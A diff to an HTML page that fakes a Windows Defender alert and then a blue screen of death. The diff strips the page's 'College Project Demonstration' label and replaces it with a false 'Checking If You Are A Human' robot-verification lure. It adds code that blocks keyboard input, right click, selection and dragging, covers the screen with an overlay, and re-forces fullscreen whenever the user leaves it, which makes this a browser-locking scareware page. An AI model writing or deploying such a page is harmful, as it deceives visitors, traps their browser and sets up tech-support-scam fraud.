@@ -10,14 +10,21 @@
             padding: 0;
             box-sizing: border-box;
             user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+        }
+        
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
         }
         
         body {
             font-family: 'Segoe UI', Arial, sans-serif;
             background-color: #f2f2f2;
             color: #333;
-            overflow: hidden;
-            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -230,25 +237,23 @@
             margin-top: 30px;
         }
         
-        #closeButton {
+        #overlay {
             position: fixed;
-            top: 15px;
-            right: 15px;
-            background: none;
-            border: none;
-            color: white;
-            font-size: 20px;
-            cursor: pointer;
-            z-index: 3000;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #0078d7;
+            z-index: 9999;
             display: none;
         }
     </style>
 </head>
 <body>
     <div id="normalContent">
-        <h1>College Project Demonstration</h1>
-        <p>This page simulates a Windows Defender security alert that leads to a BSOD.</p>
-        <p>The simulation will start automatically in <span id="countdown">5</span> seconds...</p>
+        <h1>Checking If You Are A Human</h1>
+        <p>Please wait while we process the robot verification.</p>
+        <p>Processing in <span id="countdown">5</span> seconds...</p>
     </div>
 
     <!-- Windows Defender Alert Screen -->
@@ -334,19 +339,31 @@
         </div>
     </div>
     
-    <!-- Close button that actually triggers fullscreen BSOD -->
-    <button id="closeButton">✕</button>
+    <!-- Fullscreen overlay to block browser UI -->
+    <div id="overlay"></div>
     
     <script>
-        // Prevent any key from closing the simulation
+        // Block all keyboard input
         document.addEventListener('keydown', function(e) {
             e.preventDefault();
             e.stopPropagation();
             return false;
         }, true);
         
-        // Prevent right click
+        // Block right click
         document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        }, false);
+        
+        // Block text selection
+        document.addEventListener('selectstart', function(e) {
+            e.preventDefault();
+            return false;
+        }, false);
+        
+        // Block dragging
+        document.addEventListener('dragstart', function(e) {
             e.preventDefault();
             return false;
         }, false);
@@ -371,43 +388,26 @@
             // Show Defender alert
             document.getElementById('defenderScreen').style.display = 'flex';
             
-            // Show close button (which will actually trigger BSOD)
-            document.getElementById('closeButton').style.display = 'block';
-        }
-        
-        // Close button triggers BSOD
-        document.getElementById('closeButton').addEventListener('click', function() {
-            // Hide Defender screen
-            document.getElementById('defenderScreen').style.display = 'none';
+            // Activate overlay to block browser UI
+            document.getElementById('overlay').style.display = 'block';
             
-            // Show BSOD
-            document.getElementById('bsodScreen').style.display = 'block';
-            
-            // Make the page fullscreen
+            // Request fullscreen
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen().catch(err => {
                     console.log("Fullscreen error:", err);
                 });
             }
             
-            // Simulate BSOD progress
-            let progress = 0;
-            const bsodProgressBar = document.getElementById('bsodProgressBar');
-            const bsodPercentage = document.getElementById('bsodPercentage');
-            
-            const interval = setInterval(function() {
-                progress += Math.random() * 3;
-                if (progress > 100) progress = 100;
-                
-                bsodProgressBar.style.width = progress + '%';
-                bsodPercentage.textContent = Math.floor(progress) + '% complete';
-                
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    // Keep it at 100% - no automatic exit
+            // Add event listener for when fullscreen changes
+            document.addEventListener('fullscreenchange', function() {
+                if (!document.fullscreenElement) {
+                    // If user somehow exits fullscreen, re-enter it
+                    document.documentElement.requestFullscreen().catch(err => {
+                        console.log("Fullscreen error:", err);
+                    });
                 }
-            }, 100);
-        });
+            });
+        }
         
         // Defender "Remove Threat" button
         document.getElementById('removeThreat').addEventListener('click', function() {
@@ -429,7 +429,7 @@
                 if (progress >= 100) {
                     clearInterval(interval);
                     // After scan "completes", trigger BSOD
-                    document.getElementById('closeButton').click();
+                    triggerBSOD();
                 }
             }, 100);
         });
@@ -437,8 +437,37 @@
         // Defender "Advanced Options" button
         document.getElementById('advancedOptions').addEventListener('click', function() {
             // Immediately trigger BSOD
-            document.getElementById('closeButton').click();
+            triggerBSOD();
         });
+        
+        function triggerBSOD() {
+            // Hide Defender screen
+            document.getElementById('defenderScreen').style.display = 'none';
+            
+            // Show BSOD
+            document.getElementById('bsodScreen').style.display = 'block';
+            
+            // Ensure overlay stays on top
+            document.getElementById('overlay').style.zIndex = '9999';
+            
+            // Simulate BSOD progress
+            let progress = 0;
+            const bsodProgressBar = document.getElementById('bsodProgressBar');
+            const bsodPercentage = document.getElementById('bsodPercentage');
+            
+            const interval = setInterval(function() {
+                progress += Math.random() * 3;
+                if (progress > 100) progress = 100;
+                
+                bsodProgressBar.style.width = progress + '%';
+                bsodPercentage.textContent = Math.floor(progress) + '% complete';
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    // Keep it at 100% - no automatic exit
+                }
+            }, 100);
+        }
     </script>
 </body>
 </html>
